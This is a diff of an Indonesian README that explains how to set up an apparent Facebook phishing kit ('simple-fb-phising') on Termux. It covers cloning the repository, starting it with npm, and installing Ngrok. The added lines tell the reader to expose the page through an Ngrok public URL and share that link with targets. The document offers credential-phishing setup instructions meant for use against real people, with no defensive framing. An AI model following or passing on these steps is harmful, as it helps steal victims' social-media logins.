@@ -25,7 +25,6 @@ __Install paket yang di butuhkan :__
 * `pkg install git`
 
 __Selanjutnya ikuti langkah-langkah berikut :__
-
 * `git clone https://github.com/sandhemongss/simple-fb-phising.git`
 * `cd simple-fb-phising`
 * `npm start`
@@ -39,4 +38,6 @@ __Install Ngrok :__
 * `unzip ngrok-stable-linux-arm.zip`
 
 __Autentikasi Ngrok:__
-- Setelah Ngrok terinstall, kamu perlu menghubungkan akun Ngrok kamu dengan menjalankan token autentikasi. Kamu bisa mendapatkan token dari dashboard Ngrok setelah mendaftar.
+- Setelah Ngrok terinstall, kamu perlu menghubungkan akun Ngrok kamu dengan menjalankan token autentikasi. Kamu bisa mendapatkan token dari [dashboard Ngrok](https://ngrok.com/) setelah mendaftar.
+
+- Jika Ngrok sudah berhasil di install, buka Termux lagi dan jalankan Ngrok `./ngrok http 5000`. Ngrok akan menampilkan URL publik yang bisa diakses secara online, misalnya https://random-string.ngrok.io. Salin URL ini lalu share ENJOYY.
